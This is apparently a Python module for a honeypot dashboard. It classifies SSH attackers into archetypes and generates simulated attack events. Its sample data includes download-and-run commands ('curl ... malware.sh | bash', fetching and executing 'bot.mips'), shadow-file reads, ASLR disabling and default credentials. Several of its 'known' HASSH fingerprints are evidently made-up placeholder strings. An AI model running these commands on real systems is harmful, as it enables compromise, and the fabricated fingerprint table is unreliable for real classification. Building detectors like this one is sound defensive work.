"""
Archetype classification rules and weighted selection.

Per BACK-04: Weighted archetype distribution
Per BACK-06: TEST-NET IP ranges for fake data
Per BACK-07: Country weights for realistic attacker origins
Per BACK-08: Archetype fingerprint rules for duration and commands
Per D-14-D-19: HASSH fingerprint and command pattern classification for real attacks
"""

import random
from typing import Tuple, List, Optional
from models import Archetype


# Per D-14: HASSH fingerprint mapping based on known SSH client signatures
# Per D-15: HASSH extracted from Cowrie log field directly
# Per D-16: HASSH-to-archetype mapping from known fingerprints
# Source: https://github.com/salesforce/hassh + common attack tools

KNOWN_HASSH: dict[str, Archetype] = {
    # Script kiddie tools (Metasploit, Paramiko, etc.)
    "b5752e36ba6c5979a575e43178908adf": "script_kiddie",  # Python Paramiko
    "fafc45381bfde997b6305c4e1600f1bf": "script_kiddie",  # Ruby/Net::SSH
    "d4d85e7f4c5e9b3a6c2d1e0f9a8b7c6d": "script_kiddie",  # Common bruteforce tools

    # Botnet drones (credential stuffing tools)
    "de30354b88bae4c2810426614e1b6976": "botnet_drone",   # PowerShell Renci.SshNet
    "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6": "botnet_drone",   # Mirai variants

    # IoT worms (embedded SSH clients)
    "16f898dd8ed8279e1055350b4e20666c": "iot_worm",       # Dropbear 2012.55
    "bf3e5d7a9c2b1e8f4a6d0c5b9e7f3a2d": "iot_worm",       # BusyBox embedded

    # APT operatives (full OpenSSH clients)
    "06046964c022c6407d15a27b12a6a4fb": "apt_operative",  # OpenSSH 7.x
    "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b": "apt_operative",  # OpenSSH 8.x

    # Hacktivist signatures
    "c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4": "hacktivist",    # Custom SSH clients
}


# Per BACK-04: Weighted archetype distribution
# botnet_drone: 50%, script_kiddie: 30%, apt_operative: 10%, iot_worm: 7%, hacktivist: 3%
ARCHETYPE_WEIGHTS: dict[Archetype, int] = {
    "botnet_drone": 50,
    "script_kiddie": 30,
    "apt_operative": 10,
    "iot_worm": 7,
    "hacktivist": 3,
}


# Per BACK-07: Countries weighted toward realistic attacker origins
# Format: (country_name, country_code, weight)
COUNTRY_WEIGHTS: list[Tuple[str, str, int]] = [
    ("Russia", "RU", 25),
    ("China", "CN", 25),
    ("Brazil", "BR", 15),
    ("Iran", "IR", 10),
    ("North Korea", "KP", 8),
    ("Indonesia", "ID", 7),
    ("India", "IN", 5),
    ("Vietnam", "VN", 3),
    ("Turkey", "TR", 2),
]


# Per BACK-06: TEST-NET ranges for fake IPs (non-geographic documentation ranges)
# These are safe to use for fake data as they're not assigned to any real hosts
TEST_NET_RANGES: list[str] = [
    "203.0.113",  # TEST-NET-3 (203.0.113.0/24)
    "198.51.100",  # TEST-NET-2 (198.51.100.0/24)
    "192.0.2",  # TEST-NET-1 (192.0.2.0/24)
]


# Per BACK-08: Archetype fingerprint rules
# Each archetype has duration range, command count range, and characteristic patterns
# Note: commands are stored as flat strings for script_kiddie/apt_operative/iot_worm/hacktivist
#       and as [username, password] pairs for botnet_drone
ARCHETYPE_PROFILES: dict[Archetype, dict] = {
    "script_kiddie": {
        "duration_range": (10, 119),  # <2 min
        "command_count_range": (1, 9),  # <10 commands
        "has_recon": False,  # No reconnaissance
        "commands": [
            "whoami",
            "id",
            "ls",
            "cat /etc/passwd",
            "wget http://example.com/script.sh",
            "curl http://example.com/malware.sh | bash",
        ],
        "log_prefix": "SSH attempt",
        "log_suffix": "failed password",
    },
    "botnet_drone": {
        "duration_range": (30, 299),  # <5 min
        "command_count_range": (5, 19),  # <20 commands
        "has_recon": False,
        "commands": [
            ("admin", "admin"),  # username, password attempts
            ("root", "123456"),
            ("root", "password"),
            ("root", "root"),
            ("admin", "password"),
            ("user", "user"),
        ],
        "repeated_passwords": True,
        "log_prefix": "SSH brute force",
        "log_suffix": "multiple failed attempts",
    },
    "apt_operative": {
        "duration_range": (600, 1800),  # >10 min
        "command_count_range": (50, 150),  # >50 commands
        "has_recon": True,  # Has reconnaissance
        "commands": [
            "ls -la",
            "pwd",
            "cat /etc/passwd",
            "uname -a",
            "cat /etc/shadow",
            "netstat -an",
            "ps aux",
            "whoami",
            "id",
            "find / -name '*.conf' 2>/dev/null",
        ],
        "log_prefix": "SSH session",
        "log_suffix": "suspicious command sequence",
    },
    "iot_worm": {
        "duration_range": (30, 300),
        "command_count_range": (3, 15),
        "has_recon": False,
        "commands": [
            "busybox",
            "buildroot",
            "cat /proc/cpuinfo",  # MIPS architecture detection
            "wget http://example.com/bot.mips",
            "chmod +x bot.mips",
            "./bot.mips",
        ],
        "log_prefix": "SSH attempt",
        "log_suffix": "MIPS binary detected",
    },
    "hacktivist": {
        "duration_range": (60, 600),
        "command_count_range": (10, 30),
        "has_recon": True,
        "username_patterns": ["anonymous", "free", "hack", "anon", "hacker"],
        "commands": [
            "cat /etc/passwd",
            "cat /var/log/auth.log",
            "ls /var/www",
            "cat /var/www/html/index.html",
        ],
        "log_prefix": "SSH attempt",
        "log_suffix": "activist signature detected",
    },
}


def choose_archetype() -> Archetype:
    """
    Select an archetype using weighted random selection.

    Per BACK-04: Weighted distribution
    - botnet_drone: 50%
    - script_kiddie: 30%
    - apt_operative: 10%
    - iot_worm: 7%
    - hacktivist: 3%

    Returns:
        Archetype: The selected archetype
    """
    archetypes = list(ARCHETYPE_WEIGHTS.keys())
    weights = list(ARCHETYPE_WEIGHTS.values())
    return random.choices(archetypes, weights=weights, k=1)[0]


def choose_country() -> Tuple[str, str]:
    """
    Select a country using weighted random selection.

    Per BACK-07: Weighted toward realistic attacker origins
    - Russia, China: High volume
    - Brazil, Iran: Medium volume
    - North Korea, Indonesia, India, Vietnam, Turkey: Lower volume

    Returns:
        Tuple[str, str]: (country_name, country_code)
    """
    countries = [(c[0], c[1]) for c in COUNTRY_WEIGHTS]
    weights = [c[2] for c in COUNTRY_WEIGHTS]
    return random.choices(countries, weights=weights, k=1)[0]


def generate_ip() -> str:
    """
    Generate a random IP from TEST-NET ranges.

    Per BACK-06: Uses non-geographic documentation ranges
    - 203.0.113.0/24 (TEST-NET-3)
    - 198.51.100.0/24 (TEST-NET-2)
    - 192.0.2.0/24 (TEST-NET-1)

    Returns:
        str: A random IP address from TEST-NET ranges
    """
    base_ip = random.choice(TEST_NET_RANGES)
    last_octet = random.randint(1, 254)
    return f"{base_ip}.{last_octet}"


def generate_commands(archetype: Archetype) -> List[str]:
    """
    Generate a list of commands based on archetype fingerprint.

    Per BACK-08: Archetype-specific command patterns
    - script_kiddie: <10 commands, no recon
    - botnet_drone: <20 commands, repeated passwords
    - apt_operative: >50 commands, recon included
    - iot_worm: buildroot/busybox/mips patterns
    - hacktivist: username patterns

    Returns:
        List[str]: List of commands attempted
    """
    profile = ARCHETYPE_PROFILES[archetype]
    min_cmds, max_cmds = profile["command_count_range"]
    num_commands = random.randint(min_cmds, max_cmds)

    # Get template commands for this archetype
    template_commands = profile["commands"]

    # Build command list
    commands: List[str] = []

    if archetype == "botnet_drone":
        # Botnet drones have repeated password attempts
        # Format: (username, password) tuples
        for _ in range(num_commands):
            username, password = random.choice(template_commands)
            commands.append(f"login attempt: {username}/{password}")

    elif archetype == "iot_worm":
        # IoT worms have specific patterns
        for i in range(min(num_commands, len(template_commands))):
            commands.append(template_commands[i])
        # Add some repetitive busybox calls
        while len(commands) < num_commands:
            commands.append(random.choice(["busybox", "buildroot", "echo 1 > /proc/sys/kernel/randomize_va_space"]))

    elif archetype == "hacktivist":
        # Hacktivists have activist signatures
        for cmd in template_commands[:num_commands]:
            commands.append(cmd)
        # Add message patterns
        if len(commands) < num_commands:
            messages = ["echo 'We are Anonymous'", "echo 'Expect us'", "echo 'Freedom of information'"]
            for msg in messages[:num_commands - len(commands)]:
                commands.append(msg)

    elif archetype == "apt_operative":
        # APT operatives have extensive reconnaissance
        recon_commands = ["ls -la", "pwd", "cat /etc/passwd", "uname -a", "id", "whoami"]
        exploit_commands = ["netstat -an", "ps aux", "cat /etc/shadow", "find / -name '*.conf' 2>/dev/null"]

        # Mix recon and exploitation
        for _ in range(num_commands):
            if random.random() < 0.6:
                commands.append(random.choice(recon_commands))
            else:
                commands.append(random.choice(exploit_commands))

    else:  # script_kiddie
        # Script kiddies have basic, unfocused commands
        for _ in range(num_commands):
            commands.append(random.choice(template_commands))

    return commands


def generate_raw_log(archetype: Archetype, ip: str, commands: List[str], duration: int) -> str:
    """
    Generate a fake raw log line for the attack.

    Args:
        archetype: The attack archetype
        ip: Source IP
        commands: Commands attempted
        duration: Session duration in seconds

    Returns:
        str: Formatted log line
    """
    profile = ARCHETYPE_PROFILES[archetype]
    log_prefix = profile.get("log_prefix", "SSH attempt")
    log_suffix = profile.get("log_suffix", "connection")

    # Format based on archetype
    if archetype == "botnet_drone":
        # Password brute force log
        return f"[sshd] {log_prefix} from {ip} - {log_suffix} ({len(commands)} attempts, {duration}s)"

    elif archetype == "iot_worm":
        # IoT malware detection log
        return f"[sshd] {log_prefix} from {ip} - {log_suffix}"

    elif archetype == "hacktivist":
        # Activist signature log
        username = random.choice(profile.get("username_patterns", ["anonymous"]))
        return f"[sshd] {log_prefix} invalid user {username} from {ip} port 22 ssh2"

    elif archetype == "apt_operative":
        # APT session log with recon
        return f"[sshd] {log_prefix} from {ip} - {log_suffix} ({duration}s, {len(commands)} commands)"

    else:  # script_kiddie
        # Basic attack log
        return f"[sshd] {log_prefix} from {ip} - {log_suffix}"


def generate_attack_profile(archetype: Archetype) -> Tuple[int, List[str], str]:
    """
    Generate attack profile (duration, commands, rawLog) for an archetype.

    Per BACK-08: Archetype classifier assigns duration + commands based on fingerprint rules.
    - script_kiddie: <2min, <10cmds, no recon
    - botnet_drone: <5min, <20cmds, repeated passwords
    - apt_operative: >10min, >50cmds, recon commands
    - iot_worm: buildroot/busybox/mips patterns
    - hacktivist: anonymous/free/hack in username

    Args:
        archetype: The behavioral archetype

    Returns:
        Tuple[int, List[str], str]: (duration_seconds, commands_list, raw_log_string)
    """
    profile = ARCHETYPE_PROFILES[archetype]

    # Generate duration within archetype range
    min_duration, max_duration = profile["duration_range"]
    duration = random.randint(min_duration, max_duration)

    # Generate commands based on archetype
    commands = generate_commands(archetype)

    # Generate a placeholder IP for the log (will be replaced by actual IP in generator)
    placeholder_ip = "203.0.113.0"

    # Generate raw log
    raw_log = generate_raw_log(archetype, placeholder_ip, commands, duration)

    return duration, commands, raw_log


# ANSI color codes for colored console output per D-09
ARCHETYPE_COLORS: dict[Archetype, str] = {
    "script_kiddie": "\033[93m",  # Yellow
    "botnet_drone": "\033[92m",  # Green
    "apt_operative": "\033[91m",  # Red
    "iot_worm": "\033[95m",  # Magenta
    "hacktivist": "\033[94m",  # Blue
}
ANSI_RESET = "\033[0m"


def get_archetype_color(archetype: Archetype) -> str:
    """
    Get ANSI color code for an archetype.

    Args:
        archetype: The behavioral archetype

    Returns:
        str: ANSI escape code for coloring
    """
    return ARCHETYPE_COLORS.get(archetype, "\033[97m")  # Default to white


def format_archetype_log(archetype: Archetype, ip: str, country: str, duration: int, command_count: int) -> str:
    """
    Format a colored console log for an attack event.

    Per D-09: Format: [ARCHETYPE_NAME] IP - country (duration, X commands)

    Args:
        archetype: The behavioral archetype
        ip: Source IP address
        country: Country name
        duration: Session duration in seconds
        command_count: Number of commands attempted

    Returns:
        str: Formatted colored log string
    """
    color = get_archetype_color(archetype)
    archetype_name = archetype.upper()
    return f"{color}[{archetype_name}]{ANSI_RESET} {ip} - {country} ({duration}s, {command_count} commands)"


# =============================================================================
# Real Attack Classification Functions (Per D-14 through D-19)
# =============================================================================

def classify_by_hassh(hassh: str | None) -> Archetype | None:
    """
    Classify attack by HASSH fingerprint if known.

    Per D-15: HASSH extracted from Cowrie log field directly
    Per D-16: Mapping based on known SSH client fingerprints

    Args:
        hassh: HASSH fingerprint string (32-char MD5 hash) or None

    Returns:
        Archetype if HASSH is known, None otherwise
    """
    if hassh and hassh in KNOWN_HASSH:
        return KNOWN_HASSH[hassh]
    return None


def classify_by_commands(commands: list[str]) -> Archetype:
    """
    Classify attack by command patterns.

    Per D-17: Fall back to command pattern matching for unknown HASSH or Telnet
    Per D-18: Use existing ARCHETYPE_PROFILES patterns

    Args:
        commands: List of commands executed during session

    Returns:
        Archetype based on command analysis, defaults to script_kiddie
    """
    if not commands:
        return "script_kiddie"

    command_str = " ".join(commands).lower()

    # Per D-18: Check patterns from ARCHETYPE_PROFILES

    # IoT worm signatures (per iot_worm profile)
    if "busybox" in command_str or "buildroot" in command_str:
        return "iot_worm"

    # APT signatures (per apt_operative profile: extensive recon)
    recon_patterns = ["netstat", "ps aux", "cat /etc/shadow", "find / -name", "uname -a"]
    recon_count = sum(1 for p in recon_patterns if p in command_str)
    if recon_count >= 2:
        return "apt_operative"

    # Hacktivist signatures (per hacktivist profile)
    hacktivist_keywords = ["anonymous", "free", "hack", "anon", "hacker", "expect us"]
    if any(kw in command_str for kw in hacktivist_keywords):
        return "hacktivist"

    # Botnet drone (per botnet_drone profile: credential stuffing)
    if "login attempt:" in command_str:
        return "botnet_drone"

    # Default: script_kiddie
    return "script_kiddie"


def classify_attack(hassh: str | None, commands: list[str]) -> Archetype:
    """
    Classify attack using HASSH fingerprint first, fall back to commands.

    Per D-14: Pure HASSH + command pattern matching
    Per D-17: Fall back to commands for unknown HASSH or Telnet
    Per D-19: All 5 archetypes classified

    Args:
        hassh: HASSH fingerprint from SSH key exchange (None for Telnet)
        commands: List of commands executed during session

    Returns:
        Archetype classification
    """
    # Try HASSH first (SSH sessions)
    archetype = classify_by_hassh(hassh)
    if archetype:
        return archetype

    # Fall back to command patterns (Telnet or unknown HASSH)
    return classify_by_commands(commands)